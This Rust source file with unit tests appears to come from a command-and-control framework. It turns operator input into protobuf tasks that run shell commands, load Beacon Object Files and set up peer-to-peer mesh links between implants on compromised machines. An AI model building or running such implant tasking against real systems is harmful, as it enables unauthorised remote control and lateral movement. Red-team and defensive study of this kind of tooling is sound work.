//! Task CLI library - testable functions for task dispatching
//!
//! This module contains the core logic for parsing arguments and building
//! task requests, extracted from main.rs for testability.

use anyhow::{bail, Result};
use prost::Message;
use protocol::{
    mesh_task, BofTask, DispatchTaskRequest, MeshConnect, MeshGetTopology, MeshListen, MeshTask,
    MeshTransportType, ShellTask, Uuid,
};

/// Parsed command from CLI arguments
#[derive(Debug, Clone, PartialEq)]
pub enum TaskCommand {
    Shell {
        implant_id: Vec<u8>,
        command: String,
    },
    Bof {
        implant_id: Vec<u8>,
        bof_path: String,
    },
    MeshListen {
        implant_id: Vec<u8>,
        port: u32,
    },
    MeshConnect {
        implant_id: Vec<u8>,
        peer_id: Vec<u8>,
        address: String,
        port: u32,
    },
    MeshStatus {
        implant_id: Vec<u8>,
    },
}

/// Parse a hex string into a 16-byte implant/peer ID
pub fn parse_id_hex(hex_str: &str) -> Result<Vec<u8>> {
    let bytes = hex::decode(hex_str)?;
    if bytes.len() != 16 {
        bail!(
            "ID must be 32 hex characters (16 bytes), got {} characters ({} bytes)",
            hex_str.len(),
            bytes.len()
        );
    }
    Ok(bytes)
}

/// Parse CLI arguments into a TaskCommand
pub fn parse_args(args: &[String]) -> Result<TaskCommand> {
    if args.len() < 4 {
        bail!("Not enough arguments. Usage: task <implant-id-hex> <task-type> <args...>");
    }

    let implant_id = parse_id_hex(&args[1])?;
    let task_type = &args[2];

    match task_type.as_str() {
        "shell" => {
            let command = args[3..].join(" ");
            if command.is_empty() {
                bail!("Shell command cannot be empty");
            }
            Ok(TaskCommand::Shell { implant_id, command })
        }
        "bof" => {
            let bof_path = args[3].clone();
            Ok(TaskCommand::Bof {
                implant_id,
                bof_path,
            })
        }
        "mesh" => {
            let subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            match subcommand {
                "listen" => {
                    let port: u32 = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh listen <port>"))?
                        .parse()?;
                    Ok(TaskCommand::MeshListen { implant_id, port })
                }
                "connect" => {
                    let peer_id_hex = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?;
                    let peer_id = parse_id_hex(peer_id_hex)?;
                    let address = args
                        .get(5)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?
                        .clone();
                    let port: u32 = args
                        .get(6)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?
                        .parse()?;
                    Ok(TaskCommand::MeshConnect {
                        implant_id,
                        peer_id,
                        address,
                        port,
                    })
                }
                "status" => Ok(TaskCommand::MeshStatus { implant_id }),
                _ => bail!(
                    "Unknown mesh subcommand: '{}'. Supported: listen, connect, status",
                    subcommand
                ),
            }
        }
        _ => bail!(
            "Unknown task type: '{}'. Supported: shell, bof, mesh",
            task_type
        ),
    }
}

/// Build a DispatchTaskRequest from a TaskCommand
pub fn build_request(cmd: &TaskCommand) -> Result<DispatchTaskRequest> {
    match cmd {
        TaskCommand::Shell { implant_id, command } => {
            let shell_task = ShellTask {
                command: command.clone(),
                shell: None,
                timeout_ms: Some(30000),
            };
            Ok(DispatchTaskRequest {
                implant_id: Some(Uuid {
                    value: implant_id.clone(),
                }),
                task_type: "shell".to_string(),
                task_data: shell_task.encode_to_vec(),
            })
        }
        TaskCommand::Bof {
            implant_id,
            bof_path,
        } => {
            let bof_data = std::fs::read(bof_path)?;
            let bof_task = BofTask {
                bof_data,
                entry_point: None,
                arguments: None,
            };
            Ok(DispatchTaskRequest {
                implant_id: Some(Uuid {
                    value: implant_id.clone(),
                }),
                task_type: "bof".to_string(),
                task_data: bof_task.encode_to_vec(),
            })
        }
        TaskCommand::MeshListen { implant_id, port } => {
            let mesh_task = MeshTask {
                operation: Some(mesh_task::Operation::Listen(MeshListen {
                    port: *port,
                    transport: MeshTransportType::MeshTransportTcp as i32,
                    bind_address: "0.0.0.0".to_string(),
                    pipe_name: String::new(),
                })),
            };
            Ok(DispatchTaskRequest {
                implant_id: Some(Uuid {
                    value: implant_id.clone(),
                }),
                task_type: "mesh".to_string(),
                task_data: mesh_task.encode_to_vec(),
            })
        }
        TaskCommand::MeshConnect {
            implant_id,
            peer_id,
            address,
            port,
        } => {
            let mesh_task = MeshTask {
                operation: Some(mesh_task::Operation::Connect(MeshConnect {
                    peer_id: peer_id.clone(),
                    transport: MeshTransportType::MeshTransportTcp as i32,
                    address: address.clone(),
                    port: *port,
                    pipe_name: String::new(),
                    peer_public_key: vec![],
                })),
            };
            Ok(DispatchTaskRequest {
                implant_id: Some(Uuid {
                    value: implant_id.clone(),
                }),
                task_type: "mesh".to_string(),
                task_data: mesh_task.encode_to_vec(),
            })
        }
        TaskCommand::MeshStatus { implant_id } => {
            let mesh_task = MeshTask {
                operation: Some(mesh_task::Operation::GetTopology(MeshGetTopology {})),
            };
            Ok(DispatchTaskRequest {
                implant_id: Some(Uuid {
                    value: implant_id.clone(),
                }),
                task_type: "mesh".to_string(),
                task_data: mesh_task.encode_to_vec(),
            })
        }
    }
}

/// Build a shell request directly (convenience function)
pub fn build_shell_request(implant_id: &[u8], command: &str) -> DispatchTaskRequest {
    let shell_task = ShellTask {
        command: command.to_string(),
        shell: None,
        timeout_ms: Some(30000),
    };
    DispatchTaskRequest {
        implant_id: Some(Uuid {
            value: implant_id.to_vec(),
        }),
        task_type: "shell".to_string(),
        task_data: shell_task.encode_to_vec(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const VALID_ID: &str = "D6FD48E4DF2742219B983197636F7B58";
    const VALID_PEER_ID: &str = "AABBCCDD11223344AABBCCDD11223344";

    fn args(s: &str) -> Vec<String> {
        s.split_whitespace().map(|s| s.to_string()).collect()
    }

    // ---------------------------------------------------------------------------
    // ID Parsing Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn test_parse_valid_id() {
        let id = parse_id_hex(VALID_ID).unwrap();
        assert_eq!(id.len(), 16);
        assert_eq!(id[0], 0xD6);
        assert_eq!(id[1], 0xFD);
    }

    #[test]
    fn test_parse_lowercase_id() {
        let id = parse_id_hex(&VALID_ID.to_lowercase()).unwrap();
        assert_eq!(id.len(), 16);
    }

    #[test]
    fn test_parse_id_too_short() {
        let result = parse_id_hex("D6FD48E4DF27");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("16 bytes"));
    }

    #[test]
    fn test_parse_id_too_long() {
        let result = parse_id_hex("D6FD48E4DF2742219B983197636F7B58AABB");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_id_invalid_hex() {
        let result = parse_id_hex("ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_id_empty() {
        let result = parse_id_hex("");
        assert!(result.is_err());
    }

    // ---------------------------------------------------------------------------
    // Argument Parsing Tests - Shell
    // ---------------------------------------------------------------------------

    #[test]
    fn test_parse_shell_command() {
        let cmd = parse_args(&args(&format!("task {} shell whoami", VALID_ID))).unwrap();
        match cmd {
            TaskCommand::Shell { command, .. } => assert_eq!(command, "whoami"),
            _ => panic!("Expected Shell command"),
        }
    }

    #[test]
    fn test_parse_shell_command_with_spaces() {
        let cmd = parse_args(&args(&format!("task {} shell echo hello world", VALID_ID))).unwrap();
        match cmd {
            TaskCommand::Shell { command, .. } => assert_eq!(command, "echo hello world"),
            _ => panic!("Expected Shell command"),
        }
    }

    #[test]
    fn test_parse_shell_preserves_implant_id() {
        let cmd = parse_args(&args(&format!("task {} shell test", VALID_ID))).unwrap();
        match cmd {
            TaskCommand::Shell { implant_id, .. } => {
                assert_eq!(implant_id, hex::decode(VALID_ID).unwrap());
            }
            _ => panic!("Expected Shell command"),
        }
    }

    // ---------------------------------------------------------------------------
    // Argument Parsing Tests - BOF
    // ---------------------------------------------------------------------------

    #[test]
    fn test_parse_bof_command() {
        let cmd = parse_args(&args(&format!("task {} bof /path/to/file.o", VALID_ID))).unwrap();
        match cmd {
            TaskCommand::Bof { bof_path, .. } => assert_eq!(bof_path, "/path/to/file.o"),
            _ => panic!("Expected Bof command"),
        }
    }

    // ---------------------------------------------------------------------------
    // Argument Parsing Tests - Mesh
    // ---------------------------------------------------------------------------

    #[test]
    fn test_parse_mesh_listen() {
        let cmd = parse_args(&args(&format!("task {} mesh listen 9999", VALID_ID))).unwrap();
        match cmd {
            TaskCommand::MeshListen { port, .. } => assert_eq!(port, 9999),
            _ => panic!("Expected MeshListen command"),
        }
    }

    #[test]
    fn test_parse_mesh_connect() {
        let cmd = parse_args(&args(&format!(
            "task {} mesh connect {} 192.168.1.1 8080",
            VALID_ID, VALID_PEER_ID
        )))
        .unwrap();
        match cmd {
            TaskCommand::MeshConnect {
                peer_id,
                address,
                port,
                ..
            } => {
                assert_eq!(peer_id, hex::decode(VALID_PEER_ID).unwrap());
                assert_eq!(address, "192.168.1.1");
                assert_eq!(port, 8080);
            }
            _ => panic!("Expected MeshConnect command"),
        }
    }

    #[test]
    fn test_parse_mesh_status() {
        let cmd = parse_args(&args(&format!("task {} mesh status", VALID_ID))).unwrap();
        assert!(matches!(cmd, TaskCommand::MeshStatus { .. }));
    }

    // ---------------------------------------------------------------------------
    // Argument Parsing Tests - Errors
    // ---------------------------------------------------------------------------

    #[test]
    fn test_parse_not_enough_args() {
        let result = parse_args(&args("task"));
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_unknown_task_type() {
        let result = parse_args(&args(&format!("task {} unknown arg", VALID_ID)));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Unknown task type"));
    }

    #[test]
    fn test_parse_unknown_mesh_subcommand() {
        let result = parse_args(&args(&format!("task {} mesh unknown", VALID_ID)));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Unknown mesh subcommand"));
    }

    #[test]
    fn test_parse_mesh_listen_missing_port() {
        let result = parse_args(&args(&format!("task {} mesh listen", VALID_ID)));
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_mesh_listen_invalid_port() {
        let result = parse_args(&args(&format!("task {} mesh listen notaport", VALID_ID)));
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_mesh_connect_missing_args() {
        let result = parse_args(&args(&format!("task {} mesh connect {}", VALID_ID, VALID_PEER_ID)));
        assert!(result.is_err());
    }

    // ---------------------------------------------------------------------------
    // Request Building Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn test_build_shell_request() {
        let implant_id = hex::decode(VALID_ID).unwrap();
        let cmd = TaskCommand::Shell {
            implant_id: implant_id.clone(),
            command: "whoami".to_string(),
        };
        let req = build_request(&cmd).unwrap();

        assert_eq!(req.task_type, "shell");
        assert_eq!(req.implant_id.unwrap().value, implant_id);
        assert!(!req.task_data.is_empty());

        // Verify we can decode the task data
        let shell_task = ShellTask::decode(req.task_data.as_slice()).unwrap();
        assert_eq!(shell_task.command, "whoami");
        assert_eq!(shell_task.timeout_ms, Some(30000));
    }

    #[test]
    fn test_build_mesh_listen_request() {
        let implant_id = hex::decode(VALID_ID).unwrap();
        let cmd = TaskCommand::MeshListen {
            implant_id: implant_id.clone(),
            port: 9999,
        };
        let req = build_request(&cmd).unwrap();

        assert_eq!(req.task_type, "mesh");

        // Verify we can decode the task data
        let mesh_task = MeshTask::decode(req.task_data.as_slice()).unwrap();
        match mesh_task.operation {
            Some(mesh_task::Operation::Listen(listen)) => {
                assert_eq!(listen.port, 9999);
                assert_eq!(listen.bind_address, "0.0.0.0");
            }
            _ => panic!("Expected Listen operation"),
        }
    }

    #[test]
    fn test_build_mesh_connect_request() {
        let implant_id = hex::decode(VALID_ID).unwrap();
        let peer_id = hex::decode(VALID_PEER_ID).unwrap();
        let cmd = TaskCommand::MeshConnect {
            implant_id: implant_id.clone(),
            peer_id: peer_id.clone(),
            address: "10.0.0.1".to_string(),
            port: 8080,
        };
        let req = build_request(&cmd).unwrap();

        let mesh_task = MeshTask::decode(req.task_data.as_slice()).unwrap();
        match mesh_task.operation {
            Some(mesh_task::Operation::Connect(connect)) => {
                assert_eq!(connect.peer_id, peer_id);
                assert_eq!(connect.address, "10.0.0.1");
                assert_eq!(connect.port, 8080);
            }
            _ => panic!("Expected Connect operation"),
        }
    }

    #[test]
    fn test_build_mesh_status_request() {
        let implant_id = hex::decode(VALID_ID).unwrap();
        let cmd = TaskCommand::MeshStatus {
            implant_id: implant_id.clone(),
        };
        let req = build_request(&cmd).unwrap();

        let mesh_task = MeshTask::decode(req.task_data.as_slice()).unwrap();
        assert!(matches!(
            mesh_task.operation,
            Some(mesh_task::Operation::GetTopology(_))
        ));
    }

    #[test]
    fn test_build_shell_request_convenience() {
        let implant_id = hex::decode(VALID_ID).unwrap();
        let req = build_shell_request(&implant_id, "id");

        assert_eq!(req.task_type, "shell");
        let shell_task = ShellTask::decode(req.task_data.as_slice()).unwrap();
        assert_eq!(shell_task.command, "id");
    }

    // ---------------------------------------------------------------------------
    // Round-trip Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn test_roundtrip_shell() {
        let input = args(&format!("task {} shell ls -la /tmp", VALID_ID));
        let cmd = parse_args(&input).unwrap();
        let req = build_request(&cmd).unwrap();

        let shell_task = ShellTask::decode(req.task_data.as_slice()).unwrap();
        assert_eq!(shell_task.command, "ls -la /tmp");
    }

    #[test]
    fn test_roundtrip_mesh_connect() {
        let input = args(&format!(
            "task {} mesh connect {} 172.16.0.1 5555",
            VALID_ID, VALID_PEER_ID
        ));
        let cmd = parse_args(&input).unwrap();
        let req = build_request(&cmd).unwrap();

        let mesh_task = MeshTask::decode(req.task_data.as_slice()).unwrap();
        match mesh_task.operation {
            Some(mesh_task::Operation::Connect(c)) => {
                assert_eq!(c.address, "172.16.0.1");
                assert_eq!(c.port, 5555);
            }
            _ => panic!("Expected Connect"),
        }
    }
}
